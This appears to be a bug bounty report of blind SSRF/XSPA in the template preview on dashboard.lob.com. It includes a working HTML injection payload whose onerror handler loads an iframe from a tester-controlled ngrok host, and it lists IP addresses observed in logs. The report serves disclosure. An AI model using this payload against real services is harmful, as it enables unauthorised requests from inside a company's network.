## Summary:
I was just playing around with the website and I found blind ```XSPA``` on time of creating ```Templets``` on ```dashboard.lob.com```.

## Steps To Reproduce:

  1. Go to https://dashboard.lob.com/#/templates
  1. Now click on create templet and insert this code in ```HTML``` : ```"><img src="xasdasdasd" onerror="document.write('<iframe src=https://ded8c0a6.ngrok.io></iframe>')" />``` and click on create.
  1. Now click on preview and see your ```server logs``` you can clearly see that injected code is going to rander and make backdoor connection with your server connection. 

## During my testing I have got a below internal IP address. 
```
1. 34.210.83.118
2. 34.219.18.217
3. 52.88.138.14
```

## Impact

The preview template endpoint is vulnerable to a blind SSRF/XSPA vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a lob.com instance's network.
